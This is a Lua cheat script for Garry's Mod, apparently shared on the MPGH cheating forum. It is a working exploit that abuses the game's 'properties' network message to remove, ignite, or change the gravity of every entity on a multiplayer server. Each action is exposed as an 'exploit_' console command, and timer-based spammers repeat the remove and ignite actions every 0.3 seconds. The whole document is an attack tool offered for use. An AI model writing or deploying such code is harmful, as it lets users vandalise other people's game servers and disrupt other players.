/*
	Made by andre_125 for MPGH with love
	
	Notes:
		to edit the spammer delay just edit the line 9, edit the number to the desired seconds
		
*/

local spammerDelay = 0.3

--Remove if you know what you are doing
blacklistedEntities = {
	"worldspawn",
	"player",
	"class C_PlayerResource",
	"class C_GMODGameRulesProxy",
	"class C_EnvTonemapController",
	"env_skypaint",
	"class C_FogController",
	"class C_ShadowControl",
	"class C_Sun",
	"viewmodel",
	"class C_HL2MPRagdoll",
	"weapon_",
}

function isBlackListed(ent)
	blacklisted = false
	
	for x,y in pairs(blacklistedEntities) do
		if string.find(ent:GetClass(), y)  then
			blacklisted = true
			break
		end
	end
	
	return blacklisted
end

function sendProperty(propertyName, ent)
	net.Start("properties")
		net.WriteString( propertyName )
		net.WriteEntity( ent )
	net.SendToServer()
end

function removeAll()
        for k, v in pairs ( ents.GetAll() ) do			
			if not isBlackListed(v) then
                sendProperty("remove", v)
			end
        end
end
concommand.Add( "exploit_remove_All", removeAll)

function igniteAll()
        for k, v in pairs ( ents.GetAll() ) do
					
			if not isBlackListed(v) then
                sendProperty("ignite", v)
			end
        end
end
concommand.Add( "exploit_ignite_All", igniteAll)

function gravoffAll()
        for k, v in pairs ( ents.GetAll() ) do
			//there might be some issue with gravity but hey it works		
			if not isBlackListed(v) then
                sendProperty("gravity", v)
			end
        end
end
concommand.Add( "exploit_gravity_off_All", gravoffAll)

function extinguishAll()
        for k, v in pairs ( ents.GetAll() ) do
					
			if not isBlackListed(v) then
                sendProperty("extinguish", v)
			end
        end
end
concommand.Add( "exploit_extinguish_All", extinguishAll)

function removeAllSpammer()
	if not timer.Exists("removeallspammer") then
		timer.Create("removeallspammer", spammerDelay, 0, removeAll ) 
		print("Starting remove all spammer")
	else
		timer.Destroy("removeallspammer") 
		print("Stopping remove all spammer")
	end
end
concommand.Add( "exploit_remove_all_spam", removeAllSpammer)

function igniteAllSpammer()
	if not timer.Exists("igniteallspammer") then
		timer.Create("igniteallspammer", spammerDelay, 0, igniteAll ) 
		print("Starting ignite all spammer")
	else
		timer.Destroy("igniteallspammer") 
		print("Stopping ignite all spammer")
	end
end
concommand.Add( "exploit_ignite_all_spam", igniteAllSpammer)
